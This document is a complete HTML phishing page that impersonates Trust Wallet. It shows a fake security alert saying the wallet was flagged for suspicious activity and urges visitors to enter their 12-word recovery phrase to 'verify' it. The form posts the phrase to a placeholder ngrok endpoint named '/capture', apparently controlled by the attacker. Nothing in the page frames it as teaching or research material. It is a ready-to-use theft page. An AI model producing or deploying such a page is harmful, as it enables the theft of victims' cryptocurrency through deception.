<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Trust Wallet - Secure Your Crypto</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #f5f5f5; color: #333; }
        .container { max-width: 400px; margin: 50px auto; padding: 20px; background: white; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
        h1 { text-align: center; color: #0052ff; } /* Trust Wallet blue */
        form { display: flex; flex-direction: column; }
        textarea { padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; height: 80px; }
        button { padding: 10px; background: #0052ff; color: white; border: none; border-radius: 4px; cursor: pointer; }
        button:hover { background: #0039cc; }
        .alert { color: red; font-weight: bold; text-align: center; margin-bottom: 20px; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Trust Wallet</h1>
        <div class="alert">Security Alert: Verify Your Recovery Phrase</div>
        <p>Your wallet has been flagged for suspicious activity. Enter your 12-word seed phrase below to verify and secure your funds.</p>
        <form action="https://your-ngrok-url.ngrok.io/capture" method="post">
            <textarea name="seed" placeholder="Enter your 12-word recovery phrase (space-separated)" required></textarea>
            <button type="submit">Verify and Secure</button>
        </form>
    </div>
</body>
</html>
